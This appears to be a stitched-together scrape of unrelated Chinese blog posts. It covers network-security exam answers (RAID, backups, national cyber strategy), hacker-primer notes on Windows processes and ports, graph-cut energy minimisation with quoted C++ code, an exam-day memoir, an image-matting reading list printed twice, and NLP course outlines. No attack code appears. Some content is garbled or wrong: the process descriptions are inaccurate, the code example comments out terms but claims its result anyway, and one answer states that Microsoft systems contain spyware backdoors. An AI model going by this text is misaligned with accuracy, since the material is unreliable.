  每一个磁盘驱动器都有一个镜像磁盘驱动器，镜像磁盘驱动器随时保持与原磁盘驱动器的内容一致。RAID1具有较高的安全性，但只有一半的磁盘空间被用来存储数据。为了实时保护镜像磁盘数据的一致性，RAID1磁盘控制器的负载相当大，在此性能上没有提高。RAID1主要用于在对数据安全性要求很高，而且要求能够快速恢复损坏的数据的场合。
（3）RAID3：带奇偶校验码的并行传送。 
  RAID3使用一个专门的磁盘存放所有的校验数据，而在剩余的磁盘中创建带区集分散数据的读写操作。RAID3适合用于数据密集型环境或单一用户环境，尤其有益于要访问较长的连续记录，例如数据库和Web服务器等。
（4）RAID5：无独立校验盘的奇偶校验磁盘阵列。 
  RAID5把校验块分散到所有的数据盘中。RAID5使用了一种特殊的算法，可以计算出任何一个带区校验块的存放位置，这样就可以确保任何对校验块进行的读写操作都会在所有的RAID磁盘中进行均衡，从而消除了产生瓶颈的可能。RAID5能提供较完美的性能，因而也是被广泛应用的一种磁盘阵列方案。它适合于I/O密集、高读/写比率的应用程序，如事务处理等。为了具有RAID5级的冗余度，我们至少需要三个磁盘组成的磁盘阵列。RAID5可以通过磁盘阵列控制器硬件实现，也可以通过某些网络操作系统软件实现。

35. 简述Web安全目标及技术？
Web安全目标是：
保护Web服务器及其数据的安全、
保护Web服务器和用户之间传递信息的安全、
保护终端用户计算机及其他人连入Internet的设备的安全。

Web安全技术主要包括：
Web服务器安全技术
Web应用服务安全技术
Web浏览器安全技术

36. 数据备份的种类有哪些？常用的方法有哪些？
数据备份按照备份时所备份数据的特点可以分为三种：
完全备份
增量备份
系统备份

根据数据备份所使用的存储介质种类可以将数据备份方法分成如下若干种： 
软盘备份、磁带备份、可移动存储备份、可移动硬盘备份、本机多硬盘备份和网络备份。

3.案例分析

一、我们知道，从克林顿时代的网络基础设施保护，到布什时代的网络反恐，再到奥巴马时代的创建网络司令部，美国的国家信息安全战略经历了一个“从被动预防到网络威慑”的演化过程。
据美国《纽约时报》报道，美国国防部正在采取措施加强美军网络战备战能力，其中一项措施是创建网络战司令部。网络战司令部将对目前分散在美国各军种中的网络战指挥机构进行整合。成立网络战司令部实际上是承认美国已拥有越来越多的网络战武器。克林顿时代的网络安全战略主题是基础设施保护，重点在于“全面防御”；布什时代的网络安全战略主题是网络反恐，重点在于“攻防结合”；奥巴马时代的网络安全战略已显现出“攻击为主，网络威慑”的主题。
从克林顿时代的网络基础设施保护，到布什时代的网络反恐，再到奥巴马时代的创建网络司令部，美国的国家信息安全战略经历了一个“从被动预防到网络威慑”的演化过程。而随着“棱镜事件”的曝光以及习近平任中央网络安全和信息化领导小组组长，很明显，信息安全事件已经上升到了全球性的一个战略高度话题，那么，作为一个中国公民，我们应该如何看待信息安全话题，以及你认为对我国有何种启示呢？

答：
启示如下：
一   是有序管理。

我国对信息安全问题一直十分重视，但近年来形成的条块管理体制造成国家信息安全管理出现多头管理的局面，缺乏国家层面上的统一协调和管理。
二 是实现技术自主。

我国网络领域的核心技术对外依存度很高，重要信息系统安全存在隐患。微软操作系统等重要信息化装备留有后门等间谍软件已不是秘密，黑屏事件、微软终端“五国”MSN(即时通信工具)事件足以证明美国可以随时对我国发动信息攻击。实现技术自主，加大对“核高基”技术和产品的投入非常重要。
三 是系统可控。

对于目前不能够实现技术自主的信息系统，应当加强风险评估、分级管理，实行等级保护，做到系统安全可控。
四 是加强国际合作。

我国应加强国际合作，特别是加强全球范围内的信息安全的共同治理，共同应对跨国信息安全问题。积极参与下一代互联网游戏规则的制定，利用国内广大的市场和产业，提高信息领域的话语权。

二、中国网络安全问题非常突出。随着互联网技术和应用的快速发展，中国大陆地区互联网用户数量急剧增加。据估计，到2020年，全球网络用户将上升至50亿户,移动用户将上升100亿户。我国2013年互联网用户数将达到6.48亿，移动互联网用户数达到4.61亿。网民规模、宽带网民数、国家顶级域名注册量三项指标仍居世界第一，互联网普及率稳步提升。然而各种操作系统及应用程序的漏洞不断出现，相比西方发达国家，我国网络安全技术、互联网用户安全防范能力和意识较为薄弱，极易成为境内外黑客攻击利用的主要目标。
据国家互联网应急中心(CNCERT)的数据显示，中国遭受境外网络攻击的情况日趋严重。CNCERT抽样监测发现，2013年1月1日至2月28日，境外6747台木马或僵尸网络控制服务器控制了中国境内190万余台主机；其中位于美国的2194台控制服务器控制了中国境内128.7万台主机，无论是按照控制服务器数量还是按照控制中国主机数量排名，美国都名列第一。
通过以上数字及案例，请结合自身实际感受，罗列出目前网络系统主要面临的安全隐患问题。

答：
①系统漏洞及复杂性。

创建互联网最初只用于科研和计算，其设计及技术本身并不安全。另外，主机系统和网络协议的结构复杂，以及一些难以预料的软件设计和实现过程中的疏忽及漏洞隐患，致使网络安全与防范非常繁杂困难。
②网络共享性。

网络快速发展、资源共享与更新，致使相关的法律法规、管理、运行及技术保障等方面问题难以及时有效地得到解决。网络资源共享增加更多开放端口，使黑客和病毒的侵入有机可乘，为系统安全带来更大隐患。
③网络开放性。

开放的服务、端口和通信协议等给网络带来极大的隐患和风险，而且站点主机和路由等数量剧增，致使网络监控与管理难以及时准确有效。
④身份认证难。

网络环境下的身份认证技术、机制和环节等较薄弱，常用的静态口令极不安全，以越权借用管理员的检测信道，便可窃取用户名和密码等重要信息。
⑤传输路径与结点不安全。

用户通过网络互相传输的路径多且中间结点多，因此，两端的安全保密性根本无法保证中间结点的安全问题。
⑥信息聚集度高。

信息量少且分散时，其价值不易被注意。当大量相关信息聚集以后，显示出其重要价值。网络聚集大量敏感信息后，容易受到分析性等方式的攻击。
⑦边界难确定。

为了网络升级与维护预留的扩展性致使网络边界难以确定，网络资源共享访问也使网络安全边界“长城”被削弱，致使对网络安全构成严重的威胁。

4.分析说明题

计算路由器下一跳
解析防火墙各项规则含义
 






《暗战强人：黑客攻防入门全程图解》
第一部分基础知识：
 
 

进程选项卡中一些常用的映像名称解释：
smss.exe：会话管理
csrss.exe：子系统服务器进程
winlogon.exe：管理用户登录
service.exe：系统服务进程
lsass.exe：管理IP安全策略及启动ISAKMP/Oakley（IKE）和IP安全启动程序。
svchost.exe：从动态链接库中运行服务的通用主机进程名称（在windows XP系统中通常有6个svchost.exe进程）
spoolsv.exe：将文件加载到内存中以便打印
explorer.exe：资源管理进程
internat.ext：输入法进程
 
端口分类：
1.公认端口，well known ports
2.注册端口，registered ports
3.动态端口，dynamic and/or private ports
 
常见端口：
端口：1   服务：tcpmux
 
 






之前的一个学习一直在看图像分割的部分内容，基于交互的图像分割基本都是用图割的算法，全自动的图割算法也有最小生成树的改进算法。
现在想写点东西，从算法 的最本质问题，图论中的网络流问题开始，做个总结，也算是对知识的一个回顾。
 
网络最大流，增广路，残留网络，最小割这几个基本概念是构成最大流最小割定理的基本概念。而该定理是网络流理论的基础。
 
我们还有一下几个问题需要搞清楚：
1.最本质问题就是使用图割算法解决具体问题时候，是怎样构建图的，节点对应什么，边的权值对应什么。
 
2.为什么说图割算法能够达到能量最小化。
 
3.怎么引入能量这个概念的。
 
几种最大流算法的时间复杂度：

 
Algorithm
Principle
Complexity
Ford--Fulkerson, 1956
Finding flow augmenting paths
O(nm2)
Dinic, 1970
Shortest augmenting paths in one step
O(n2m)
in a dense graph:
O(n3)
in a sparse graph:
O(nm log(n))
Goldberg--Tarjan, 1985
Pushing a pre-flow
O(nm log(n2/m))

 









记得2013年元月几号我忘了，那是一个寒冷的冬天下午，我来到提前一个月就在师范大学门口的城中村里订好的一个干净单人间，又另加10块钱从房东那租了一个很大的小太阳，就准备找邓局去学校食堂吃饭，那时邓菊已经先我一年考上成了学长。
走在学校的围墙边我想起三年前，那时候大约是大二，每到星期天一大早我就和邓菊很早起来去学校听免费的考研数学辅导，当时数学一的辅导班第一次上课只有20人，后面上课的人数还居然随着时间的推进呈现了指数级的下降，但每次上课时老师的热情不减，国立西安大学数学系几大高手都是用吉米多维奇习题集（我从来都闻所未闻）来和我们仅余的学生过招。 
高手们出完题十分钟后下来转一圈，看见我草稿纸上啥也没写，也只是皱皱眉。
当然我数学不很好，一生很长时间都在和它死磕，为了证明我自己。
然后想到马上就要考试了，忽然觉得恍如隔世，去师大吃完饭，就匆匆回了屋准备睡觉。小太阳很暖和，也很亮，照的我，一夜未眠。
还好第二天一早是考政治，一些机械性的活儿，我甚至自信的觉得可以用我独有的意识流答题法应付所有政治简答题，国家社会个人怎么应对，最后发起号召每个人贡献一份力量——都是套路！

然而，好戏才刚刚开始。
2013年国家研究生入学考试刚刚启用条形码扫描，这天风和日丽，我清晰的记得那个漂亮的监考老师先发了一张答题卡，另一个猥琐大叔小心翼翼的给每个人发了一个不干胶条形码，一发完就叮嘱到：赶紧贴条形码啊各位，不然没分数！于是我就乖乖贴上，然后那个漂亮的女老师又发了一张答题卡，我看到这张答题卡的时候大脑忽然一片空白。
那个女老师问：大家是不是都把条形码贴错了？因为她发现她先发的答题卡二，后发的答题卡一。 
整个考场突然陷入一片死寂，甚至并没有人抱怨什么，我想大家都和我一样都暂时短路了。
我忽然觉的坐在边上的女生很淡定，她居然拿起笔开始作答了。
而我突然什么也不想做，有一种奇怪的感觉涌上来，这种感觉让我想起1年前西北大学408计算机专业基础综合考试时读完操作系统大题整整用了15分钟，然后不知道这题说了些啥，换了一个组成原理大题又是15分钟无用功。然后我开始质疑自己，我TM四年有上过课么？有啊！我心里说，我TM还考过90分呢，怎么现在和废柴一样什么也做不了？
我又想起5年前的2008年理综考场。同样的感觉，那一年题比较难，做完选择填空只剩一个多小时，卷子翻面首先映入眼帘的是化学大题，看第一道纯计算，看第二道纯计算，看最后一道，好家伙推断题里面还是带计算。不是大纲说好了不考化学计算么？
人与人之间基本的信任呢？

监考老师此时又说话了：大家试试把条形码撕下来，重新贴到第一张答题卡上。很不幸，我一向比较谨慎，刚才贴完条形码还用手捋了捋！此时的我已经放弃治疗，只是静静的看着旁边这个还在奋笔疾书仿佛置身事外的女生。
接下来让我大跌眼镜的一幕出现了，她准备用直尺来撕条形码，然后撕拉一声扯成了两半，我下巴都要掉地上了，她先贴了一半，又不慌不忙继续开始撕剩下的一半，我就这样看着她零零碎碎的撕了半天，而我一个字也没往卷子上写，直到她在一篇残骸上用手捋了捋，又继续开始淡定作答的时候我又怔怔的出神了。
TM这一年都干嘛了？从西安到深圳就是个错误，再从深圳回西安考研，天天早起去省图，跑那么远，做题背英语政治，图个啥。现在可好，第一门政治，上来就要没成绩了，答个p啊。
就好像08年高考，面对全篇的化学计算我不知所措一样，这样考场上苍白无力的感觉又回来了！我依稀记得高考那时我斜对面也有个淡定的女生，她看到化学计算的时候爆了句：卧槽，然后我们对视一眼，她就拿起笔开始硬着头皮上了！后来她考的真的不错，考去了上海呢！
她们怎么都这么淡定！

我回过神来，看看旁边，TM这女娃条形码都撕成碎片了，还写啥啊，我去，她居然都写了一整页了。
忽然那种苍白无力的感觉消失了，人家女娃心理素质都这么好，我一个大老爷们儿瞎担忧个什么。 
于是我在答题卡上写了一个大大的答字又加上了一个加粗的冒号，开启了陕师大的求学之旅。
感谢那个我也不曾认识的女生，我脆弱的心理素质经此一役上升到了温柔如玉杀人如麻的全新境界。
其实考完我的心情并没有完全平复，考试这48个小时我基本没有怎么休息，但我回家后第一时间考虑的就是怎么面对现实。因为很有可能政治就是零分，一年白搞了！所以当天晚上我就投了简历，第二天也就是周一就接到了面试通知。
接下来的八个月里，又是另外一个菜鸟程序员东拼西凑写程序的故事了。这期间因为初试成绩全院前五，面试口语还不错，当着数学大牛的面手写了几个泰勒展开，有惊无险的过了初试。
偶尔想起来之前种种经历，我会有一种错觉，这么多插曲？我是怎么走到现在的？！
电影还没谢幕，好戏还在上演。

最后，与大家分享 《Invictus/不可征服》的 节选：
I am the master of my fate. 
I am the captain of my soul. 






1.相对于能量函数来说，能量最小化的办法都有哪些？
  梯度下降
  模拟退火
  图割
 
2.这个 跟最优化问题的求解，有什么联系跟区别呢？
基本上差不多，其实就是求出来了函数的一个最小值，我们看问题的时候不妨把能量二字去掉。单纯的理解为函数
 
3.这个能量的观点是否跟信息熵类似，让系统的熵最小？
其实也都差不多，都是求最小值的。
 
 
我们可以看到下面的代码就求出来了相关表达式，在x =0 ，y = 1， z= 1时候能够取得最小值。
 
 
 
/* energy.h */
/* Vladimir Kolmogorov (vnk@cs.cornell.edu), 2003. */

/*
	This software implements an energy minimization technique described in

	What Energy Functions can be Minimized via Graph Cuts?
	Vladimir Kolmogorov and Ramin Zabih. 
	To appear in IEEE Transactions on Pattern Analysis and Machine Intelligence (PAMI). 
	Earlier version appeared in European Conference on Computer Vision (ECCV), May 2002. 

	More specifically, it computes the global minimum of a function E of binary
	variables x_1, ..., x_n which can be written as a sum of terms involving
	at most three variables at a time:

		E(x_1, ..., x_n) = \sum_{i}     E^{i}    (x_i)
		                 + \sum_{i,j}   E^{i,j}  (x_i, x_j)
		                 + \sum_{i,j,k} E^{i,j,k}(x_i, x_j, x_k)

	The method works only if each term is "regular". Definitions of regularity
	for terms E^{i}, E^{i,j}, E^{i,j,k} are given below as comments to functions
	add_term1(), add_term2(), add_term3(). 

	This software can be used only for research purposes. IF YOU USE THIS SOFTWARE,
	YOU SHOULD CITE THE AFOREMENTIONED PAPER IN ANY RESULTING PUBLICATION.

	In order to use it, you will also need a MAXFLOW software which can be
	obtained from http://www.cs.cornell.edu/People/vnk/software.html


	Example usage
	(Minimizes the following function of 3 binary variables:
	E(x, y, z) = x - 2*y + 3*(1-z) - 4*x*y + 5*|y-z|):

	///////////////////////////////////////////////////

	#include <stdio.h>
	#include "energy.h"

	void test_energy()
	{
		// Minimize the following function of 3 binary variables:
		// E(x, y, z) = x - 2*y + 3*(1-z) - 4*x*y + 5*|y-z|
		   
		Energy::Var varx, vary, varz;
		Energy *e = new Energy();

		varx = e -> add_variable();
		vary = e -> add_variable();
		varz = e -> add_variable();

		e -> add_term1(varx, 0, 1);  // add term x ,常数项为0，一次项系数为1
		e -> add_term1(vary, 0, -2); // add term -2*y
		e -> add_term1(varz, 3, 0);  // add term 3*(1-z)

		//e -> add_term2(x, y, 0, 0, 0, -4); // add term -4*x*y
		//e -> add_term2(y, z, 0, 5, 5, 0); // add term 5*|y-z|

		Energy::TotalValue Emin = e -> minimize();
		
		printf("Minimum = %d\n", Emin);
		printf("Optimal solution:\n");
		printf("x = %d\n", e->get_var(varx));
		printf("y = %d\n", e->get_var(vary));
		printf("z = %d\n", e->get_var(varz));

		delete e;
	}

	///////////////////////////////////////////////////
*/

 
 

输出结果：
 

 
boykov跟kolmogorkov与2001年提出的一种新的最大流最小割算法，该算法基于增广路算法，通过扩展，标记，更新被标记的节点，形成新的搜索树，并不断重复。
标准移动的定义：在进行能量函数的最优化过程中，仅改变图像中一个像素点的视差标记值,如图 4-2（b）示。通过这种标准移动很容易遇到局部极小值，从而不能准确的计算出能量函数的最小值。而α 扩展移动则是对那些视差标记不为α 的集合同时进行大规模的优化（多个像素同时进行标准移动），使其中的一部分像素点的视差标记重新被标记为α ，剩余的像素点集合的视差标记值保持不变，如图 4-2（c）示，视差标记为β 和γ 中的部分像素点被重新标记为α
 。而α − β交换移动则是在一次交换移动（可以理解为优化）的过程中，视差标记α 像素点集合和视差标记为β 的像素点集合同时大规模进行交换（swap），而那些视差标记不等于α 和β 的像素点集合则不改变，如图 4-2（d）示，标记为γ 的像素集合没有发生改变，视差标记α 像素点集合和视差标记为β 进行了部分交换。

 
 
 
图像分割论文合集下载：
 
http://download.csdn.net/detail/wangyaninglm/8292305
 






    
自然图像抠图/视频抠像技术发展情况梳理（image matting, alpha matting, video matting）--计算机视觉专题1        
     
分类：             
Computer Vision              2014-04-14 13:52    
84人阅读     
评论(0)    
收藏    
举报    



自然图像抠图/视频抠像技术发展情况梳理


Sason@CSDN


持续更新.

当前更新日期2013.03.05, 添加Fast Mating、Global Matting、视频扣像。

当前更新日期2013.04.23, 添加2本Computer Vision书籍中相关章节。

当前更新日期2013.07.21, 添加CVPR 2013中2篇论文。

当前更新日期2013.08.19, 强推一个网站“http://www.alphamatting.com”。



此网站作为初学者研究Matting首选。第一次查到它时，评估做的没有这么详细。所以我自己做了这个调研。



自然图像抠图：

1. Bayesian Matting, Chuang, CVPR 2001.

http://grail.cs.washington.edu/projects/digital-matting/papers/cvpr2001.pdf  论文下载

http://grail.cs.washington.edu/projects/digital-matting/image-matting/ 项目网址

2. GraphCut Segmentation System, Rother, 2004.

http://pdf.aminer.org/000/292/851/demonstration_of_segmentation_with_interactive_graph_cuts.pdf 论文下载

http://pub.ist.ac.at/~vnk/software.html     Vladimir Kolmogorov

http://vision.csd.uwo.ca/code/ — some graph cut libraries and MATLAB wrappers

http://www.cis.upenn.edu/~jshi/GraphTutorial/ 宾大石建波老师做的教程

http://code.google.com/p/segmentationgraphcut/  Implementation of the articleStar Shape Prior for Graph-Cut Image Segmentation

3. Possion Matting, Sun, 2004.

http://research.microsoft.com/pubs/69117/poissonmatting_siggraph04.pdf 论文下载

http://www.cad.zju.edu.cn/home/zldong/code.html 浙江大学CAD&CG LAB董子龙主页

4. Lazy Snapping, Li, 2004.

http://research.microsoft.com/apps/pubs/default.aspx?id=69040  论文下载

http://lzhj.me/archives/93 一个博客中的相关介绍

https://github.com/zhijie/lazy-snapping-  C++实现

http://cs.brown.edu/courses/csci1950-g/results/final/thale/  一个学生的实现

http://www.cs.cmu.edu/~mohitg/segmentation.htm   "Lazy Snapping"和“GrabCut”的Matlab实现，基于交互式图割

5. Easy Matting, Guan, Eurographics,2006.

http://www.cad.zju.edu.cn/home/chenwei/research/EG2006_paper.pdf 论文下载

6. Flash Matting, Sun,ACM Transactions on Graphics, 2006.

http://research.microsoft.com/en-us/um/people/jiansun/papers/FlashMatting_SIGGRAPH06.pdf 论文下载

7. Robust Matting, Wang,CVPR 2007.

grail.cs.washington.edu/pub/papers/wang2007robust.pdf 论文下载

8. Spectral Matting, Levin, CVPR 2006.

http://www.vision.huji.ac.il/SpectralMatting/  项目网址，包括论文、代码和数据

9. Closed-form Matting, Levin, CVPR 2007.

http://people.csail.mit.edu/alevin/matting.tar.gz  代码下载网址

10. Learning-based Matting, Zheng, ICCV 2009.

http://www.mathworks.com/matlabcentral/fileexchange/31412  代码下载网址

11. Shared Matting, Gastal, Eurographics, 2010.

www.inf.ufrgs.br/~eslgastal/SharedMatting/  项目地址

http://download.csdn.net/detail/jlwyc/4676516  一个OpenCV实现

12. Fast Matting,K. He,CVPR2010.

mmlab.ie.cuhk.edu.hk/2010/CVPR10_FastMatting.pdf 

13. Global Matting, K. He, CVPR 2011.

research.microsoft.com/pubs/147302/heetal.pdf

14. Non-local Matting, Lee, CVPR 2011.

http://users.eecs.northwestern.edu/~pgl622/files/NonlocalMatting_Lee_2011.pdf  论文下载

15. KNN Matting, Chen, CVPR 2012.

http://ihome.ust.hk/~dli/projects/knn/  项目网址，包括论文、代码和数据



16. Improving Image Matting Using Comprehensive Sampling Sets, CVPR, 2013.

http://www.cv-foundation.org/openaccess/content_cvpr_2013/papers/Shahrian_Improving_Image_Matting_2013_CVPR_paper.pdf

17. Image Matting with Local and Nonlocal Smooth Priors, CVPR, 2013.
http://www.ece.nus.edu.sg/stfpage/eletp/Papers/cvpr13_matting.pdf


视频抠像：



1. Video Matting of Complex Scenes, ACM Transactions on Graphics, 2002.
grail.cs.washington.edu/pub/papers/Chuang-2002-VMC.pdf

2. Bayesian video matting using learnt image priors, CVPR 2004.

www.robots.ox.ac.uk/~nema/publications/Apostoloff04c.pdf

3. Defocus Video Matting, ACM Trans. Graph.2005.

http://dash.harvard.edu/bitstream/handle/1/4101995/mcguire-defocus.pdf?sequence=2

4. Natural video matting using camera arrays, ACM Transactions on Graphics, 2006.

http://graphics.ucsd.edu/papers/camera_array_matting/MultiCameraMatting.pdf

5. Spectral Video Matting, VMV, 2009.

vmv09.tu-bs.de/downloads/papers/eis09.pdf

6. Temporally coherent video matting, Graph.Models, 2010.

visualcomputing.yonsei.ac.kr/papers/2010/matting.pdf

7. Automatic Spectral Video Matting, PR, 2012.

http://www.sciencedirect.com/science/article/pii/S0031320312004463
8. Video Matting Using Multi-Frame Nonlocal Matting Laplacian, ECCV, 2012.
yuwing.kaist.ac.kr/papers/eccv12_videomatte.pdf



其他资料：

1. Image and Video Matting: A Survey, Wang, 2007

http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.190.1825&rep=rep1&type=pdf

2. A Perceptually Motivated Online Benchmark for ImageMatting

http://www.alphamatting.com/

3. 数字抠像的最新研究进展 - 自动化学报 2012

www.aas.net.cn/qikan/manage/wenzhang/20121002.pdf

4. Bayesian & Robust Matting & Flash Matting的实现

http://mpac.ee.ntu.edu.tw/~sutony/vfx_matting/index.html

5. Image Matting GUI，4 algorithms include Poisson Matting

http://www.cs.unc.edu/~lguan/Research.files/Research.htm#IM

6. Some Techniques of Natural Image and Video Matting

http://www.cad.zju.edu.cn/home/zldong/course/CV2/Image%20Matting.doc

7. Richard J. Radke,Computer Vision forVisual Effects, Cambridge, 2013.

Chapter 2, Image Matting.

8. Richard Szeliski, Computer Vision: Algorithm andApplication, 2010.

Chapter 10. 4, Image matting andcompositing.

 



自然图像抠图/视频抠像技术发展情况梳理（image matting, alpha matting, video matting）--计算机视觉专题1

http://blog.csdn.net/anshan1984/article/details/8581225

图像/视觉显著性检测技术发展情况梳理(Saliency Detection、Visual Attention）--计算机视觉专题2
http://blog.csdn.net/anshan1984/article/details/8657176

超像素分割技术发展情况梳理(Superpixel Segmentation）--计算机视觉专题3
http://blog.csdn.net/anshan1984/article/details/8918167







自然图像抠图/视频抠像技术发展情况梳理


Sason@CSDN


持续更新.

当前更新日期2013.03.05, 添加Fast Mating、Global Matting、视频扣像。

当前更新日期2013.04.23, 添加2本Computer Vision书籍中相关章节。

当前更新日期2013.07.21, 添加CVPR 2013中2篇论文。

当前更新日期2013.08.19, 强推一个网站“http://www.alphamatting.com”。



此网站作为初学者研究Matting首选。第一次查到它时，评估做的没有这么详细。所以我自己做了这个调研。



自然图像抠图：

1. Bayesian Matting, Chuang, CVPR 2001.

http://grail.cs.washington.edu/projects/digital-matting/papers/cvpr2001.pdf  论文下载

http://grail.cs.washington.edu/projects/digital-matting/image-matting/ 项目网址

2. GraphCut Segmentation System, Rother, 2004.

http://pdf.aminer.org/000/292/851/demonstration_of_segmentation_with_interactive_graph_cuts.pdf 论文下载

http://pub.ist.ac.at/~vnk/software.html     Vladimir Kolmogorov

http://vision.csd.uwo.ca/code/ — some graph cut libraries and MATLAB wrappers

http://www.cis.upenn.edu/~jshi/GraphTutorial/ 宾大石建波老师做的教程

http://code.google.com/p/segmentationgraphcut/  Implementation of the articleStar Shape Prior for Graph-Cut Image Segmentation

3. Possion Matting, Sun, 2004.

http://research.microsoft.com/pubs/69117/poissonmatting_siggraph04.pdf 论文下载

http://www.cad.zju.edu.cn/home/zldong/code.html 浙江大学CAD&CG LAB董子龙主页

4. Lazy Snapping, Li, 2004.

http://research.microsoft.com/apps/pubs/default.aspx?id=69040  论文下载

http://lzhj.me/archives/93 一个博客中的相关介绍

https://github.com/zhijie/lazy-snapping-  C++实现

http://cs.brown.edu/courses/csci1950-g/results/final/thale/  一个学生的实现

http://www.cs.cmu.edu/~mohitg/segmentation.htm   "Lazy Snapping"和“GrabCut”的Matlab实现，基于交互式图割

5. Easy Matting, Guan, Eurographics,2006.

http://www.cad.zju.edu.cn/home/chenwei/research/EG2006_paper.pdf 论文下载

6. Flash Matting, Sun,ACM Transactions on Graphics, 2006.

http://research.microsoft.com/en-us/um/people/jiansun/papers/FlashMatting_SIGGRAPH06.pdf 论文下载

7. Robust Matting, Wang,CVPR 2007.

grail.cs.washington.edu/pub/papers/wang2007robust.pdf 论文下载

8. Spectral Matting, Levin, CVPR 2006.

http://www.vision.huji.ac.il/SpectralMatting/  项目网址，包括论文、代码和数据

9. Closed-form Matting, Levin, CVPR 2007.

http://people.csail.mit.edu/alevin/matting.tar.gz  代码下载网址

10. Learning-based Matting, Zheng, ICCV 2009.

http://www.mathworks.com/matlabcentral/fileexchange/31412  代码下载网址

11. Shared Matting, Gastal, Eurographics, 2010.

www.inf.ufrgs.br/~eslgastal/SharedMatting/  项目地址

http://download.csdn.net/detail/jlwyc/4676516  一个OpenCV实现

12. Fast Matting,K. He,CVPR2010.

mmlab.ie.cuhk.edu.hk/2010/CVPR10_FastMatting.pdf 

13. Global Matting, K. He, CVPR 2011.

research.microsoft.com/pubs/147302/heetal.pdf

14. Non-local Matting, Lee, CVPR 2011.

http://users.eecs.northwestern.edu/~pgl622/files/NonlocalMatting_Lee_2011.pdf  论文下载

15. KNN Matting, Chen, CVPR 2012.

http://ihome.ust.hk/~dli/projects/knn/  项目网址，包括论文、代码和数据



16. Improving Image Matting Using Comprehensive Sampling Sets, CVPR, 2013.

http://www.cv-foundation.org/openaccess/content_cvpr_2013/papers/Shahrian_Improving_Image_Matting_2013_CVPR_paper.pdf

17. Image Matting with Local and Nonlocal Smooth Priors, CVPR, 2013.
http://www.ece.nus.edu.sg/stfpage/eletp/Papers/cvpr13_matting.pdf


视频抠像：



1. Video Matting of Complex Scenes, ACM Transactions on Graphics, 2002.
grail.cs.washington.edu/pub/papers/Chuang-2002-VMC.pdf

2. Bayesian video matting using learnt image priors, CVPR 2004.

www.robots.ox.ac.uk/~nema/publications/Apostoloff04c.pdf

3. Defocus Video Matting, ACM Trans. Graph.2005.

http://dash.harvard.edu/bitstream/handle/1/4101995/mcguire-defocus.pdf?sequence=2

4. Natural video matting using camera arrays, ACM Transactions on Graphics, 2006.

http://graphics.ucsd.edu/papers/camera_array_matting/MultiCameraMatting.pdf

5. Spectral Video Matting, VMV, 2009.

vmv09.tu-bs.de/downloads/papers/eis09.pdf

6. Temporally coherent video matting, Graph.Models, 2010.

visualcomputing.yonsei.ac.kr/papers/2010/matting.pdf

7. Automatic Spectral Video Matting, PR, 2012.

http://www.sciencedirect.com/science/article/pii/S0031320312004463
8. Video Matting Using Multi-Frame Nonlocal Matting Laplacian, ECCV, 2012.
yuwing.kaist.ac.kr/papers/eccv12_videomatte.pdf



其他资料：

1. Image and Video Matting: A Survey, Wang, 2007

http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.190.1825&rep=rep1&type=pdf

2. A Perceptually Motivated Online Benchmark for ImageMatting

http://www.alphamatting.com/

3. 数字抠像的最新研究进展 - 自动化学报 2012

www.aas.net.cn/qikan/manage/wenzhang/20121002.pdf

4. Bayesian & Robust Matting & Flash Matting的实现

http://mpac.ee.ntu.edu.tw/~sutony/vfx_matting/index.html

5. Image Matting GUI，4 algorithms include Poisson Matting

http://www.cs.unc.edu/~lguan/Research.files/Research.htm#IM

6. Some Techniques of Natural Image and Video Matting

http://www.cad.zju.edu.cn/home/zldong/course/CV2/Image%20Matting.doc

7. Richard J. Radke,Computer Vision forVisual Effects, Cambridge, 2013.

Chapter 2, Image Matting.

8. Richard Szeliski, Computer Vision: Algorithm andApplication, 2010.

Chapter 10. 4, Image matting andcompositing.

 



自然图像抠图/视频抠像技术发展情况梳理（image matting, alpha matting, video matting）--计算机视觉专题1

http://blog.csdn.net/anshan1984/article/details/8581225

图像/视觉显著性检测技术发展情况梳理(Saliency Detection、Visual Attention）--计算机视觉专题2
http://blog.csdn.net/anshan1984/article/details/8657176

超像素分割技术发展情况梳理(Superpixel Segmentation）--计算机视觉专题3
http://blog.csdn.net/anshan1984/article/details/8918167










文章大纲文本可视化内涵文本信息层级文本可视化的研究内容文本可视化流程文本信息挖掘视图绘制人机交互文本信息分析基础分词技术及词干提取向量空间模型词袋模型文本的相似性度量tf-idf主题模型可视化，大数据最完美的呈现方式数据统计的维度语料分析的展现维度参考文献 









文章大概matplotlib 可视化相关设置matplotlib seaborn 绘图加载中文字体CentOS 安装中文字体查看matplotlib 字体目录查看系统可用的中英文字体matplotlib  设置中文字体seaborn设置中文字体其他解决 matplotlib 中文显示的思路
matplotlib 可视化相关设置
matplotlib 文档：
matplotlib api
字体相关设置：matplotlib.font_manager
 









文章大纲名企需求NLP 领域总体情况一览总体情况知识体系提升方案核心能力提升熟练相关框架熟练NLP 的知识结构熟练机器学习相关算法详实的项目经验学习资源题库资源优秀题目优秀博文精彩案例1.文本搜索2.综合可视化3.文本生成 









本博客为《自然语言处理实战课程》---- 第一课：自然语言处理简介 讲稿

文章大纲个人简介本节课程导览1.自然语言处理（NLP）简介1.1 基础技术1.2 NLP 核心技术1.3 NLP+（高端技术）1.4 课程涵盖的主要内容总揽2.知名NLP服务系统与开源组件简介2.1 单一服务提供商2.1.1 汉语分词系统ICTCLAS2.1.2 哈工大语言云（Language Technology Platform，LTP）2.1.3 HanLP2.1.4 BosonNLP2.2 云服务提供商2.2.1 Amazon Comprehend2.2.2 阿里云NLP2.2.3 腾讯云NLP2.2.4 百度语言处理基础技术2.3 NLP开源组件简介2.3.1 NLTK2.3.2 Jieba分词2.3.3 ICTCLAS2.3.4 Gensim参考文献

大家好，今天开始和大家分享，我在自然语言处理（Natural Language Processing，NLP）的一些学习经验和心得体会。
随着人工智能的快速发展，自然语言处理和机器学习技术的应用愈加广泛。为使大家对该领域整体概况有一个系统、明晰的认识，同时入门一些工程实践，也借CSDN为NLP的学习，开发者们搭建一个交流的平台。
个人简介
王雅宁， 2016年毕业于陕西师范大学计算机软件与理论专业。
CSDN博客专家，主要专注于大数据，计算机视觉，自然语言处理
对大数据机器学习类软件开发技术都有比较浓厚的兴趣，熟悉数据分析，机器学习，计算机视觉等领域的研发工作。熟悉windows，Linux下的c/c++开发，OpenCV图形图像库的各类接口。熟悉大数据生态圈下的Python开发。
曾参与并负责国家级安全项目相关POC验证与探索工作，在客户业务场景下验证产品的功能与性能。
主要工作内容有：
1、在客户现场搭建大数据产品平台，与客户沟通，根据客户的需求或业务场景在大数据平台上实现大数据平台软件的项目实施与安装部署。
